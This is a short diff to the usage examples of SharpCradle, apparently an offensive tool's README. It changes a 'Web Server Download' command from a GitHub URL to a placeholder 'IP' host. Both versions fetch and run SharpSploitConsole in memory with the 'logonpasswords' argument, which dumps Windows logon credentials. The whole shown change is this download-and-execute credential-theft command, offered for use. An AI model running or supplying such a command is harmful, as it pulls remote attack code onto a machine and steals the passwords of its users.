@@ -27,7 +27,7 @@ Examples
 
 Web Server Download:
 
-```SharpCradle.exe -w https://github.com/anthemtotheego/SharpSploitConsole/blob/master/CompiledBinaries/SharpSploitConsole_x64.exe?raw=true logonpasswords```
+```SharpCradle.exe -w https://IP/SharpSploitConsole_x64.exe logonpasswords```
 
 File Server Download Anonymous:
 
